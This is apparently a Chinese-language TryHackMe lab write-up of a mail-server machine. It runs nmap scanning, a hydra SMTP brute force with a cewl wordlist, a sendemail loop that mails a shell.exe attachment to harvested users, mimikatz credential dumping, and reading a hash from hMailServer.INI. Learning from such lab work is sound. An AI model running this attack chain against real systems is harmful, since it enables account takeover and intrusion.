---
title: '[thm] You_Got_Mail'
date: 2025-02-14 19:37 +0800
categories: [hack,TryHackMe]
tags: []
---

## information

```
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 19:39 CST
Initiating Ping Scan at 19:39
Scanning 10.10.196.213 [4 ports]
Completed Ping Scan at 19:39, 0.41s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:39
Completed Parallel DNS resolution of 1 host. at 19:39, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:39
Scanning 10.10.196.213 [18 ports]
Discovered open port 3389/tcp on 10.10.196.213
Discovered open port 135/tcp on 10.10.196.213
Discovered open port 139/tcp on 10.10.196.213
Discovered open port 587/tcp on 10.10.196.213
Discovered open port 25/tcp on 10.10.196.213
Discovered open port 110/tcp on 10.10.196.213
Discovered open port 445/tcp on 10.10.196.213
Discovered open port 49666/tcp on 10.10.196.213
Discovered open port 143/tcp on 10.10.196.213
Discovered open port 49664/tcp on 10.10.196.213
Discovered open port 49667/tcp on 10.10.196.213
Discovered open port 5985/tcp on 10.10.196.213
Discovered open port 47001/tcp on 10.10.196.213
Discovered open port 49665/tcp on 10.10.196.213
Discovered open port 49674/tcp on 10.10.196.213
Discovered open port 49670/tcp on 10.10.196.213
Discovered open port 49672/tcp on 10.10.196.213
Discovered open port 49668/tcp on 10.10.196.213
Completed SYN Stealth Scan at 19:39, 0.70s elapsed (18 total ports)
Nmap scan report for 10.10.196.213
Host is up, received timestamp-reply ttl 127 (0.33s latency).
Scanned at 2025-02-14 19:39:11 CST for 1s

PORT      STATE SERVICE       REASON
25/tcp    open  smtp          syn-ack ttl 127
110/tcp   open  pop3          syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
143/tcp   open  imap          syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
587/tcp   open  submission    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5985/tcp  open  wsman         syn-ack ttl 127
47001/tcp open  winrm         syn-ack ttl 127
49664/tcp open  unknown       syn-ack ttl 127
49665/tcp open  unknown       syn-ack ttl 127
49666/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49668/tcp open  unknown       syn-ack ttl 127
49670/tcp open  unknown       syn-ack ttl 127
49672/tcp open  unknown       syn-ack ttl 127
49674/tcp open  unknown       syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
           Raw packets sent: 22 (944B) | Rcvd: 19 (832B)
```

## user1

![alt text](<../assets/img/2025-02-14-[thm] You_Got_Mail.assets/image.png>)

浏览网页可以发现几个邮箱账号，尝试爆破。

` cewl --lowercase https://brownbrick.co > dic.txt` 生成字典。

```
┌──(root㉿bamuwe)-[~/M]
└─# hydra -L usernames -P dic.txt `cat IP ` smtp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-14 19:34:00
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1134 login tries (l:6/p:189), ~71 tries per task
[DATA] attacking smtp://10.10.196.213:25/
[STATUS] 676.00 tries/min, 676 tries in 00:01h, 458 to do in 00:01h, 16 active
[25][smtp] host: 10.10.196.213   login: lhedvig@brownbrick.co   password: bricks
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-14 19:35:28
```

user1**lhedvig@brownbrick.co:bricks**

## user2

通过前面获得的账户给其他用户投递邮件

```sh
for i in cat $(cat usernames );do sendemail -f 'lhedvig@brownbrick.co' -t "$i" -u 'test' -m 'test' -a shell.exe -s 10.10.42.35 -xu 'lhedvig@brownbrick.co' -xp 'bricks';done
Feb 15 19:20:55 bamuwe sendemail[7201]: ERROR => Can't use improperly formatted email address: cat
Feb 15 19:20:59 bamuwe sendemail[7202]: Email was sent successfully!
Feb 15 19:21:02 bamuwe sendemail[7203]: Email was sent successfully!
Feb 15 19:21:06 bamuwe sendemail[7204]: Email was sent successfully!
Feb 15 19:21:10 bamuwe sendemail[7205]: Email was sent successfully!
Feb 15 19:21:14 bamuwe sendemail[7206]: Email was sent successfully!
Feb 15 19:21:18 bamuwe sendemail[7207]: Email was sent successfully!
```

![alt text](<../assets/img/2025-02-14-[thm] You_Got_Mail.assets/image-1.png>)

获得了一个shell
接下来上传mimikatz抓取密码
![alt text](<../assets/img/2025-02-14-[thm] You_Got_Mail.assets/image-3.png>)

sekurlsa::logonpasswords

![alt text](<../assets/img/2025-02-14-[thm] You_Got_Mail.assets/image-2.png>)

user2**wrohit:superstar**

## system 

查看C:\Program Files (x86)\hMailServer\Bin>下的hMailServer.INI可以获得密码hash

![alt text](<../assets/img/2025-02-14-[thm] You_Got_Mail.assets/image-4.png>)

system**administartor:password**

## conclusion

- 第一次做关于邮件的靶机，挺有意思的
- mimikatz是个好东西hah
